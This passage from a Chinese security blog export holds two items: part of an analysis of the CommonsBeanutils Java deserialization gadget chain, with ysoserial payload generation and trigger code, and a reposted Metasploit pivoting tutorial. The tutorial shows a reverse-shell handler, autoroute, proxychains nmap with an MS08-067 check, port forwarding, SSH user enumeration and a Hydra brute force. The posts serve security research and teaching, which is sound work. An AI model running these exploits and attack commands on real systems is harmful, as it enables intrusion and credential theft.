{</span><br><span class="line">                public Object run() {</span><br><span class="line">                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                }</span><br><span class="line">            });</span><br><span class="line"></span><br><span class="line">        try {</span><br><span class="line">            final int classCount = _bytecodes.length;</span><br><span class="line">...</span><br><span class="line">            for (int i = 0; i &lt; classCount; i++) {</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">...</span><br><span class="line">            }</span><br><span class="line">...</span><br><span class="line">        catch (ClassFormatError e) {</span><br><span class="line">...</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>从代码中可以看到，newTransformer 中调用了 TransformerImpl 的构造函数，此构造函数的第一个参数就调用了一个私有的 getTransletInstance() 函数，前面生成templates对象时，没有给它的成员变量 _class 赋值，所以接着调用了 defineTransletClasses() 函数，最后在 defineTransletClasses() 函数中可以看到定义了一个类加载器（TransletClassLoader），使用这个类加载器加载 _bytecodes 成员变量的字节码，通过前面的梳理可以知道是 Gadgets 类的内部静态类 StubTransletPayload，当这个类加载成功后，有 Javaassist 动态注入的静态初始化方法就会执行，也就是我们最终的目标:  <strong>Runtime.exec</strong>。</p>
<h3 id="四、验证"><a href="#四、验证" class="headerlink" title="四、验证"></a>四、验证</h3><p>为了验证上述的推理过程，我们可以用如下的两段代码进行调试验证:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">// 将下面三行代码追加到 CommonsBeanutilsCollectionsLogging1 类的 templates 的返回对象后面</span><br><span class="line">// 在 ysoerial 目录中执行 mvn clean;mvn package</span><br><span class="line">// 然后执行 java -jar ./target/ysoserial-0.0.5-SNAPSHOT-all.jar CommonsBeanutilsCollectionsLogging1 'touch /tmp/123qwe'</span><br><span class="line">// 可以单独生成 templates 对象的序列化文件 /tmp/TemplatesImpl.ser</span><br><span class="line"> FileOutputStream fos = new FileOutputStream("/tmp/TemplatesImpl.ser");</span><br><span class="line"> ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line"> oos.writeObject(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 保存为 ReadObject.java 文件，执行 javac ReadObject.java;java -classpath .:./target/ysoserial-0.0.5-SNAPSHOT-all.jar ReadObject</span><br><span class="line">// 执行成功后可以在 /tmp/ 下看到 123qwe 文件</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class ReadObject {</span><br><span class="line"> public static void main(String[] args) throws Exception {</span><br><span class="line"> ObjectInputStream oin = new ObjectInputStream(new FileInputStream("/tmp/TemplatesImpl.ser"));</span><br><span class="line"> TemplatesImpl templates = (TemplatesImpl)oin.readObject();</span><br><span class="line"> templates.getOutputProperties(); //很关键的触发语句</span><br><span class="line"> }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="五、调用链"><a href="#五、调用链" class="headerlink" title="五、调用链"></a>五、调用链</h3><p>最终分析出的反序列化调用链如下:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">			PriorityQueue.heapify()</span><br><span class="line">				PriorityQueue.siftDown()</span><br><span class="line">					siftDownUsingComparator()</span><br><span class="line">						BeanComparator.compare()</span><br><span class="line">							TemplatesImpl.getOutputProperties()</span><br><span class="line">								TemplatesImpl.newTransformer()</span><br><span class="line">									TemplatesImpl.getTransletInstance()</span><br><span class="line">										TemplatesImpl.defineTransletClasses()</span><br><span class="line">											TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">												Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">													Runtime.exec()</span><br></pre></td></tr></tbody></table></figure>

<h3 id="六、影响范围"><a href="#六、影响范围" class="headerlink" title="六、影响范围"></a>六、影响范围</h3><p>去年受到 Java 反序列化影响的容器、应用软件若是依靠升级 commons-collections 来处理漏洞，同时在 Java 的运行环境当中包含了 commons-beanutils.jar 和 commons-logging.jar，是仍然有可能受到 Java 反序列化的攻击的。</p>
<p>目前并没有相关官方补丁来修复该问题，临时解决方案是检查应用业务对外接口，尽量禁止对外的序列化数据接口。</p>
<p>作者：niubl | Categories:<a href="https://blog.knownsec.com/category/research/" target="_blank" rel="noopener">安全研究</a> | Tags: <a href="https://blog.knownsec.com/tag/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" target="_blank" rel="noopener">漏洞分析</a></p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>漏洞挖掘</tag>
        <tag>java反序列化</tag>
        <tag>CommonsBeanUtils</tag>
      </tags>
  </entry>
  <entry>
    <title>图解Meterpreter实现网络穿透的方法（转载）</title>
    <url>/posts/552008504/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为博主「<a href="https://www.freebuf.com/author/%E9%B8%A2%E5%B0%BE" target="_blank" rel="noopener" title="由 鸢尾 发布">鸢尾</a>」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">图解Meterpreter实现网络穿透的方法</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>纵深防御也被被称之为“多层防御”，这样的概念被运用于“信息安全”上。以多层电脑安全技术去减轻其风险，在其中有些电脑被入侵或是泄密时，风险可以大大降低。举例来说，防毒软件被安装于个人工作站上，电脑中病毒在防火墙与服务器等其它类似环境中被拦劫下来。在信息技术世界中占据着举足轻重的地位。本文我们将通过示例分析攻击者是如何运用各种方法进行网络穿透的。</strong></p>
<h2 id="何谓路由"><a href="#何谓路由" class="headerlink" title="何谓路由"></a>何谓路由</h2><p>确定设备如何在不同网络之间相互传输的过程，也即通过互联的网络把信息从源地址传输到目的地址的活动被称之为路由。通常用于执行路由活动的设备被称为路由器。通过使用路由表，路由器则规划网络包到各自目的地的线路。路由的功能不仅仅是诸如路由器等网络设备能够完成，在安装有该功能的任意计算机系统也能够完成。</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload1523896630075694834-833b0bc4.jpeg" alt=""></p>
<p>根据上图例子所示，为了在192.168.1.0/24与192.168.10.0/24网络之间进行通信是需要一个路由表记录的。根据路由器中的规则定义，数据需要从192.168.1.0/24源网络发到192.168.10.0/24目的网络中去。网络数据包大概会经历如下过程：</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload2182326104961899848-3092a9d8.jpeg" alt="xiaoguo.png"></p>
<h2 id="何谓Pivoting"><a href="#何谓Pivoting" class="headerlink" title="何谓Pivoting"></a>何谓Pivoting</h2><p>基本上可以概括为，在正常情况下仅仅只是通过利用被控制的计算机我们可能依旧无法进行网络访问。假设一台被控制的计算机连接有多个网络，将其作为我们的跳板，那么网络隔离的手段对我们来说就形同虚设。跟着这个思路，攻击者在被控制的跳板主机上执行路由操作，进而访问隐藏的网络。对新发现网络发起的每个请求都会通过中间的双网卡跳板传输，形象化一点说来就像是洞子一般。</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload1559361849457611787-7c7ab240.jpeg" alt=""></p>
<p>就如上面所示的拓扑图，设备有两张网卡可访问192.168.1.0/24以及192.168.10.0/24两个网络。在正常情况下，这两个网络之间是不能相互访问的，除非有定义路由规则。根据该结构，授权用户（使用两张网卡的计算机）可访问DMZ区内的一些服务。</p>
<h2 id="拿下第一层双网卡中转跳板及端口转发"><a href="#拿下第一层双网卡中转跳板及端口转发" class="headerlink" title="拿下第一层双网卡中转跳板及端口转发"></a>拿下第一层双网卡中转跳板及端口转发</h2><p>根据我们的攻击场景，先拿下命名为RD的主机然后获取到的meterpreter shell，RD能连接到DMZ网络。随后，在信息收集过程中确定了目标有两张网卡。注意：环境中的路由器在两个网络之间并没有联通。</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload7005181247861049882-bb922f9c.jpeg" alt=""></p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 172.16.0.20</span><br><span class="line">LHOST =&gt; 172.16.0.20</span><br><span class="line">msf exploit(handler) &gt; set LPORT 1234</span><br><span class="line">LPORT =&gt; 1234</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 172.16.0.20:1234</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957487 bytes) to 172.16.0.11</span><br><span class="line">[*] Meterpreter session 2 opened (172.16.0.20:1234 -&gt; 172.16.0.11:49162)</span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">Hardware MAC : 08:00:27:e1:3f:af</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 172.16.0.11</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 19</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter #2</span><br><span class="line">Hardware MAC : 08:00:27:7f:3c:fe</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 7.7.7.11</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br></pre></td></tr></tbody></table></figure>

<p>在我们设计的这个场景中，获得RD系统访问权限的攻击者将会使用第二张网卡(7.7.7.0/24)访问网络。在执行这项操作之前，攻击者必须先在RD中定义路由规则。</p>
<p>在Metasploit中可以轻松完成这项任务，在当前meterpreter会话下键入以下命令可创建路由规则：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 7.7.7.0/24</span><br><span class="line">[*] Adding a route to 7.7.7.0/255.255.255.0...</span><br><span class="line">[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"> Subnet Netmask Gateway</span><br><span class="line"> ------ ------- -------</span><br><span class="line"> 7.7.7.0 255.255.255.0 Session 2</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>根据定义的路由规则，只要meterpreter ID值为2的会话在运行，那么在Metasploit框架中就可以访问7.7.7.0/24网络。<br>这一步骤之后，使用类似arp_scanner的端口模块就能检测到JC系统的IP地址。JC为7.7.7.20内网中的另一台计算机。</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24</span><br><span class="line">[*] Running module against DISCORDIA</span><br><span class="line">[*] ARP Scanning 7.7.7.0/24</span><br><span class="line">[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)</span><br><span class="line">[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>在7.7.7.0/24网络中存活系统的IP地址，包括命名为JC的系统主机，都已经检测到了。</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload3396985355640221909-b2f563ee.jpeg" alt=""></p>
<p>自然而然的，我们想到了以下问题：诸如arp_scanner的端口模块对这类扫描工作可能存在着不足之处，那么nmap风格的扫描工具是否能登场呢？</p>
<h2 id="通过中转跳板进行Nmap扫描"><a href="#通过中转跳板进行Nmap扫描" class="headerlink" title="通过中转跳板进行Nmap扫描"></a>通过中转跳板进行Nmap扫描</h2><p>对此必须在Metasploit中激活路由配置，并且该配置必须能够通过socks4代理进行转发。这里有一个metasploit模块刚好满足以上需求。</p>
<p>使用metasploit的socks4代理模块：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  </span><br><span class="line">msf auxiliary(socks4a) &gt; set srvhost 172.16.0.20</span><br><span class="line">srvhost =&gt; 172.16.0.20</span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">msf auxiliary(socks4a) &gt; netstat -antp | grep 1080</span><br><span class="line">[*] exec: netstat -antp | grep 1080</span><br><span class="line">tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby   </span><br><span class="line">msf auxiliary(socks4a) &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>ProxyChains是为GNU\Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4, SOCKS5, HTTP / HTTPS路由到目的地。在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload902789656886484278-628c79d8.jpeg" alt=""></p>
<p>用文本编辑器打开/etc/proxychains.conf，在文件的最后一行添加新创建的socks4代理服务器</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">--- snippet ---</span><br><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to "tor"</span><br><span class="line">#socks4  127.0.0.1 9050</span><br><span class="line">socks4  172.16.0.20 1080</span><br></pre></td></tr></tbody></table></figure>

<p>使用proxychains执行nmap扫描任务非常简单，网络数据包将会通过定义的代理发送到目的地。</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.25BETA1 ( https://nmap.org )</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Nmap scan report for 7.7.7.20</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">PORT     STATE    SERVICE      VERSION</span><br><span class="line">22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)</span><br><span class="line">80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9</span><br><span class="line">135/tcp  open     msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003</span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs: CVE:CVE-2008-4250</span><br><span class="line">|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|          code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></tbody></table></figure>

<p>根据扫描的结果，目标系统中运行着SSH以及HTTP服务。在进一步利用之前，我们还将涉及另一种被称之为端口转发的通信路由(traffic routing)技术。</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发是实现中转跳板的基本步骤，目前还无法直接访问到隐藏网络中的服务，这是因为没有建立双向路由。我们知道如何到达目标系统，所以可以发起请求。但这个请求会失败，这是因为目标系统不知道如何到达我们这边。</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload7867376389150579252-e31f1e39.jpeg" alt=""></p>
<p>基于这个原因，我们可以通过定义meterpreter会话在我们的本地开启一个端口，将本地数据包发送到目的地。只要进程存活，路由就会一直工作。</p>
<p>再此须谨记，run autoroute命令建立的路由仅在Metasploit框架下有效，我们也可以尝试使用kali工具实现目的，这里我们就要借助类似端口转发的工具或是proxychains。</p>
<p>使用portfwd模块(Metasploit中的一个post模块)可完成端口转发</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">    -L &lt;opt&gt;  Forward: local host to listen on (optional). Remote: local host to connect to.</span><br><span class="line">    -R        Indicates a reverse port forward.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the "list" command).</span><br><span class="line">    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.</span><br><span class="line">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">    -r &lt;opt&gt;  Forward: remote host to connect to.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>当我们在浏览器中向本地2323端口发送一个链接请求时，该连接请求将会转发到IP地址为7.7.7.20的计算机的80端口。<br>得益于ProxyChains和Nmap，早先我们就已经确定了web服务运行在7.7.7.20的80端口。为了访问这个服务，本地系统的2323端口将被转发到7.7.7.20的80端口</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20</span><br><span class="line">[*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>通过portfwd list命令可以查看当前活跃的端口转发规则：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line">   Index  Local             Remote       Direction</span><br><span class="line">   -----  -----             ------       ---------</span><br><span class="line">   1      172.16.0.20:2323  7.7.7.20:80  Forward</span><br><span class="line">1 total active port forwards.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>检测到IP地址为7.7.7.20目标系统的80端口上运行着名为<strong>Eash File Sharing Web Server</strong>的应用</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload50147402844487092-874af3bc.jpeg" alt=""></p>
<h2 id="通过中转跳板进行SSH暴力破解"><a href="#通过中转跳板进行SSH暴力破解" class="headerlink" title="通过中转跳板进行SSH暴力破解"></a>通过中转跳板进行SSH暴力破解</h2><p>正如你看到的，我们检测到的7.7.7.20上有一个ssh服务。对该服务进行暴力破解十分简便。我们可以使用SSH_enumusers这个辅助模块来完成这项工作：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20</span><br><span class="line">rhosts =&gt; 7.7.7.20</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; set rport 22</span><br><span class="line">rport =&gt; 22</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt</span><br><span class="line">user_file =&gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt; run</span><br><span class="line">[*] 7.7.7.20:22 - SSH - Checking for false positives</span><br><span class="line">[*] 7.7.7.20:22 - SSH - Starting scan</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'admin' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'root' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'Administrator' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'sysadm' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'tech' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'operator' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'guest' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'security' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'debug' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'manager' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'service' not found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User '!root' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'user' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'netman' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'super' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'diag' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'Cisco' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'Manager' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'DTA' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'apc' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'User' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'Admin' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'cablecom' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'adm' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'wradmin' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'netscreen' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'sa' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'setup' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'cmaker' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'enable' not found</span><br><span class="line">[+] 7.7.7.20:22 - SSH - User 'MICRO' found</span><br><span class="line">[-] 7.7.7.20:22 - SSH - User 'login' not found</span><br><span class="line">[*] Caught interrupt from the console...</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">^C</span><br><span class="line">msf auxiliary(ssh_enumusers) &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>除了Metasploit框架中的辅助模块外，Kali工具包中的Hydra也可以完成这项任务。通过在ProxyChains下运行Hydra，所有的通信数据将会通过被控制的主机（双网卡主机）传送到目标系统上。</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting</span><br><span class="line">[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task</span><br><span class="line">[DATA] attacking service ssh on port 22</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">[22][ssh] host: 7.7.7.20   login: admin   password: 123456</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">&lt;&gt;&lt;&gt;-OK</span><br><span 